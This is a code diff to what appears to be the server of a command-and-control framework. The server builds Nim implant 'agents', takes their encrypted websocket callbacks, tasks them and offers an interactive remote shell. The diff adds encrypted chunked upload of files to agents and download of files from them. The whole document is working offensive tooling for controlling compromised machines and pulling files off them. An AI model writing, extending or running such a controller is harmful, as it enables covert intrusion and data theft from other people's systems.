@@ -16,11 +16,12 @@ import _thread
 import threading
 import asyncio
 from collections import deque
-from nacl.public import PublicKey, PrivateKey, Box 
+from nacl.public import PublicKey, PrivateKey, Box
 
-agents = {}
-unconnected = {}
 keys = []
+agents = {}
+transfers = {}
+unconnected = {}
 websocket_servers = {}
 shell = 0
 active_count = 0
@@ -67,11 +68,22 @@ def encrypt(input, pubkey):
   ciphertext = box.encrypt(plaintext)
   return ciphertext.hex().upper()
 
+def encryptBytes(input, pubkey):
+  box = Box(srvseckey, PublicKey(bytes.fromhex(pubkey)))
+  ciphertext = box.encrypt(input)
+  return ciphertext.hex().upper()
+
 def decrypt(input, pubkey):
   input = input.strip()
   box = Box(srvseckey, PublicKey(bytes.fromhex(pubkey)))
   ciphertext = bytes.fromhex(input)
   return box.decrypt(ciphertext).decode()
+
+def decrypt_bytes(input, pubkey):
+  input = input.strip()
+  box = Box(srvseckey, PublicKey(bytes.fromhex(pubkey)))
+  ciphertext = bytes.fromhex(input)
+  return box.decrypt(ciphertext)
 
 def mkagent(platform, ip, port, id):
   count = 1
@@ -95,7 +107,7 @@ def mkagent(platform, ip, port, id):
 
   if file != original:
     original = id
-    id = re.sub('\.nim$', '', file)
+    id = re.sub('\\.nim$', '', file)
     add_output('Agent renamed: ' + original + ' -> ' + id + '\n', True)
 
   code = re.sub('ADDRESS', ip, code)
@@ -119,7 +131,7 @@ def mkagent(platform, ip, port, id):
   subprocess.run(['resources/builder/build', platform, id],
                  stdout=subprocess.DEVNULL,
                  stderr=subprocess.DEVNULL)
-  add_output('Done')
+  add_output('Done\n')
 
   with open('resources/config.json') as f:
     conf = json.load(f)
@@ -196,12 +208,17 @@ def scroll_lines(listbox, n):
   new_pos = max(0, min(len(walker) - 1, pos + n))
   walker.set_focus(new_pos)
 
-def add_task(task_name, task_data):
+def add_task(task_name, task_data, agent_id='all'):
   global agents
   new_task = [task for task in task_list if task['name'] == task_name][0]
   new_task["data"] = task_data
-  for x in agents:
-    agent = agents[x]
+  if agent_id == 'all':
+    for x in agents:
+      agent = agents[x]
+      if agent["active"]:
+        agent["task"] = new_task
+  else:
+    agent = agents.get(agent_id)
     if agent["active"]:
       agent["task"] = new_task
 
@@ -281,6 +298,33 @@ def process_input(key: str):
       elif term.prompt_text.edit_text == 'shell':
         shell = 1
         add_output('[SHELL]', True)
+        term.prompt_text.edit_text = ''
+
+      elif term.prompt_text.edit_text.startswith('upload'):
+        if ' ' in term.prompt_text.edit_text:
+          file = term.prompt_text.edit_text.split(' ')[1]
+          if os.path.isfile(file):
+            total = str(os.path.getsize(file))
+            add_task('upld', file + ' ' + total)
+            add_output('>> ' + term.prompt_text.edit_text)
+          else:
+            add_output('Usage: upload [local file]')
+        if len(term.prompt_history) == 0 or term.prompt_text.edit_text != term.prompt_history[-1]:
+          term.prompt_history.append(term.prompt_text.edit_text)
+        term.prompt_text.edit_text = ''
+
+      elif term.prompt_text.edit_text.startswith('download'):
+        if ' ' in term.prompt_text.edit_text and active_count == 1:
+          add_task('dnld', term.prompt_text.edit_text.split(' ', 1)[1])
+          add_output('>> ' + term.prompt_text.edit_text)
+        elif ' ' in term.prompt_text.edit_text and any(agent["id"] == term.prompt_text.edit_text.split(' ')[1] for agent in agents.values()):
+          add_task('dnld', term.prompt_text.edit_text.split(' ', 2)[2], term.prompt_text.edit_text.split(' ')[1])
+          add_output('>> ' + term.prompt_text.edit_text)
+        else:
+          add_output('Usage: download [remote file]')
+          add_output('       Agent ID required when using multiple agents.\n')
+        if len(term.prompt_history) == 0 or term.prompt_text.edit_text != term.prompt_history[-1]:
+          term.prompt_history.append(term.prompt_text.edit_text)
         term.prompt_text.edit_text = ''
 
       elif [task for task in task_list if task['name'] == term.prompt_text.edit_text.split(' ')[0]]:
@@ -388,34 +432,43 @@ def process_input(key: str):
     if term.up_count < len(term.prompt_history):
       term.up_count += 1
       term.prompt_text.edit_text = term.prompt_history[len(term.prompt_history) - term.up_count]
+      term.prompt_text.set_edit_pos(len(term.prompt_text.edit_text))
   elif key == 'down':
     if term.up_count > 1:
       term.up_count -= 1
       term.prompt_text.edit_text = term.prompt_history[len(term.prompt_history) - term.up_count]
+      term.prompt_text.set_edit_pos(len(term.prompt_text.edit_text))
     elif term.up_count == 1:
       term.up_count -= 1
       term.prompt_text.edit_text = ''
 
-async def ws(websocket, path):
+async def ws(websocket, path='/wss'):
   try:
-    receive = True
+    init = True
+    transfer = False
+    receive = False
+
     while True:
       global agents
       global shell
       global active_count
 
       if receive:
+        # Allow agent to reconnect
+        callback = await websocket.recv()
+      elif init:
+        # Allow agent to connect
         try:
           callback = await websocket.recv()
           if static_keys:
             for id in unconnected:
               pubkey = unconnected.get(id)
               message = decrypt(callback, pubkey)
-              if message == id: 
+              if message == id:
                 unconnected.pop(id, None)
                 add_output('Callback: ' + id + '\n', True)
                 add_agent(id, websocket.local_address[1], pubkey)
-                receive = False
+                init = False
           elif dynamic_keys:
             for id in unconnected:
               hex_id = id.encode().hex().upper()
@@ -424,38 +477,77 @@ async def ws(websocket, path):
                 unconnected.pop(id, None)
                 add_output('Callback: ' + id + '\n', True)
                 add_agent(id, websocket.local_address[1], pubkey)
-                receive = False
+                init = False
         except:
           pass
       else:
+        # Send tasks and receive output
         port = websocket.local_address[1]
         agent = agents.get(port)
-        if agent["task"]:
-          task = json.dumps(agent["task"])
-          agent["task"] = None
-          await websocket.send(encrypt(task, agent["pubkey"]))
-          response = await websocket.recv()
-          response = decrypt(response, agent["pubkey"])
-          if active_count > 1:
-            add_output('[' + agent["id"] + ']', True)
-          add_output(response)
-          if shell == 0:
-            add_output('')
 
-          if response == 'Done':
-            agent["active"] = False
-            agent["task"] = None
-            if static_keys:
-              unconnected[id] = agent["pubkey"]
+        if agent["task"]:
+          task = agent["task"]
+          await websocket.send(encrypt(json.dumps(task), agent["pubkey"]))
+
+          if task["name"] == 'upld':
+            size = 0
+            path = task["data"].split(' ')[0]
+            total = int(task["data"].split(' ')[1])
+            response = await websocket.recv()
+            response = decrypt(response, agent["pubkey"])
+            if response == 'Okay':
+              add_output('Sending ' + str(total) + ' bytes...\n')
+              with open(path, "rb") as f:
+                while size < total:
+                  f.seek(size)
+                  chunk = f.read(65536)
+                  await websocket.send(encryptBytes(chunk, agent["pubkey"]))
+                  size += len(chunk)
+                add_output('Done\n')
             else:
-              unconnected[id] = 'dynamic'
-            active_count -= 1
-            agents.pop(port, None)
-            interactive = False
-            receive = True
- 
+              add_output(response + '\n')
+
+          elif task["name"] == 'dnld':
+            size = 0
+            if ' ' in task["data"]:
+              path = task["data"].split(' ')[1]
+            else:
+              path = re.sub('.*/', '', task["data"])
+            response = await websocket.recv()
+            total = int(decrypt(response, agent["pubkey"]))
+            add_output('Getting ' + str(total) + ' bytes...\n')
+            while size < total:
+              response = await websocket.recv()
+              response = decrypt_bytes(response, agent["pubkey"])
+              size += len(response)
+              with open(path, 'ab') as f:
+                f.write(response)
+            add_output('Done\n')
+
+          else:
+            response = await websocket.recv()
+            response = decrypt(response, agent["pubkey"])
+            if active_count > 1:
+              add_output('[' + agent["id"] + ']', True)
+            add_output(response)
+            if shell == 0:
+              add_output('')
+  
+            if response == 'Done':
+              agent["active"] = False
+              if static_keys:
+                unconnected[id] = agent["pubkey"]
+              else:
+                unconnected[id] = 'dynamic'
+              active_count -= 1
+              receive = True
+          agent["task"] = None
+
   except websockets.ConnectionClosed:
-    add_output(f"Connection to {path} closed unexpectedly\n")
+    if receive:
+      pass
+    else:
+      add_output(f"Connection to {path} closed unexpectedly\n")
 
 async def start_websocket_server(uri):
   global websocket_servers
